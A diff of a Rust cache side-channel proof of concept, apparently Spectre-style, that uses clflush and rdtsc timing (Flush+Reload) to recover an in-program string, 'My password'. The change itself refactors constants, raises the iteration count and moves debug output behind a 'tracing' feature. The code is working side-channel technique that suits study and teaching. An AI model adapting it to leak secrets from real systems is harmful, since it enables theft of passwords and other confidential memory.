@@ -8,20 +8,14 @@ use std::arch::x86_64::_mm_lfence;
 use std::arch::x86_64::_mm_mfence;
 use std::arch::x86_64::_rdtsc;
 
-// Somehow like the define, the value will be injected as a constant at comp time
-macro_rules! stride {
-    () => {
-        (1024)
-    };
-}
+const THRESHOLD: u64 = 160;
+const STRIDE: usize = 1024;
 
 const data_size: usize = 16;
 static mut public_data: [u8; 160] = [2; 160];
 
-const array_for_prediction: [u8; 256 * stride!()] = [0; 256 * stride!()];
+const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
 const secret_data: &str = "My password";
-
-// force read function...TODO, lets add an asm! call here :)
 
 // To avoid optimization of the victim code
 static mut tmp: u8 = 0;
@@ -30,33 +24,22 @@ fn victim_code(branch_selector: usize) {
     if branch_selector < data_size {
         // tmp is mut static which means that its mutability is rule by unsafe blocks :"
         unsafe {
-            tmp &= array_for_prediction[public_data[branch_selector] as usize * stride!()];
+            tmp &= array_for_prediction[public_data[branch_selector] as usize * STRIDE];
         }
     }
 }
 
 fn read_memory_offset(ptr: *const u8) -> u8 {
     let result: u8 = 0;
-    //println!("Reading at {}", ptr as usize);
     unsafe {
         asm!(
             "mov {result}, [{x}]",
             x = in(reg) ptr,
             result = out(reg_byte) _
-            // : "=r"(result) // Use "=r" to assign to an 8-bit register
-                                   //: "r"(ptr)
-                                   //: // no clobbers
-           // : "volatile"
         );
     };
     result
 }
-
-// force address read
-
-//void force_read(uint8_t *p) {
-//    asm volatile("" : : "r"(*p) : "memory");
-//}
 
 // Returns the best two indexes and the best two values
 #[no_mangle]
@@ -77,12 +60,12 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
         latencies[i] = 0;
         scores[i] = 0;
     }
-    for i in 0..100000 {
+    for i in 0..200000 {
         // flush lines clflush
         // PRIME
         for j in 0..256 {
             unsafe {
-                _mm_clflush(&array_for_prediction[j * stride!()] as *const u8);
+                _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
             }
         }
         // Wait a little to the cache to flush
@@ -95,35 +78,25 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
         // Set the cache
         for j in 0..100 {
             unsafe {
-                let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * stride!()]
+                let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * STRIDE]
                     as *const u8;
                 tmp &= read_memory_offset(addr);
             };
-            //print!("{} ", j);
-            //read_memory_offset(addr);
         }
-
-        //println!("Starting");
 
         for j in 0..256 {
             // To avoid stride caching
             let mix_i = ((j * 167) + 13) & 255;
 
-            let addr = &array_for_prediction[mix_i * stride!() as usize] as *const u8;
+            let addr = &array_for_prediction[mix_i * STRIDE as usize] as *const u8;
             // let start = unsafe { _rdtsc() };
             // Read the mem addr
-            let end =  unsafe {
+            let end = unsafe {
                 let start = _rdtsc();
-               tmp &= read_memory_offset(addr);
-               _rdtsc() - start
+                tmp &= read_memory_offset(addr);
+                _rdtsc() - start
             };
-            //read_memory_offset(addr);
-            // unsafe { tmp &= array_for_prediction[addr] }
-            // TODO, add the asm! call here
-            // victim_code(malicious_x);
-            // let end = unsafe { _rdtsc() } - start;
-            //print!("{}, ", end);
-            if end < 160 {
+            if end < THRESHOLD {
                 // let c = mix_i as u8 as char;
                 // println!("{} {} {}", mix_i, end, c);]
                 scores[mix_i] += 1;
@@ -147,19 +120,23 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
         value[0] = max1 as u64;
         value[1] = max2 as u64;
 
-
         if scores[max1 as usize] > 2 * scores[max2 as usize] {
             // println!("Breaking");
             break;
         }
     }
 
-    //for j in scores {
-    //     print!("{}, ", j);
-   //}
+    #[cfg(feature = "tracing")]
+    {
+        eprint!("a = [");
+        for j in scores {
+            eprint!("{}, ", j);
+        }
+        eprintln!("]");
+    }
 
     // For some reason we need a time delay here
-    for _ in 0..10000 {}
+    for _ in 0..100000 {}
 
     //println!(" >");
     (score, value)
@@ -185,18 +162,21 @@ pub fn main() {
         public_data[14] = 15;
         public_data[15] = 16;
     }
-    println!("Reading %d bytes");
 
     for j in 0..11 {
         let (score, value) = read_memory_byte(j);
         // get value 0 as char
         let ch = value[0] as u8 as char;
         let ch2 = value[1] as u8 as char;
+
+        #[cfg(feature = "tracing")]
         println!(
             // The value as char
             "Reading at malicious_x {} = {}:{}:{} (second {} {})",
             j, ch, value[0], score[0], score[1], value[1]
         );
-        //break;
+
+        #[cfg(not(feature = "tracing"))]
+        println!("{}", ch);
     }
 }
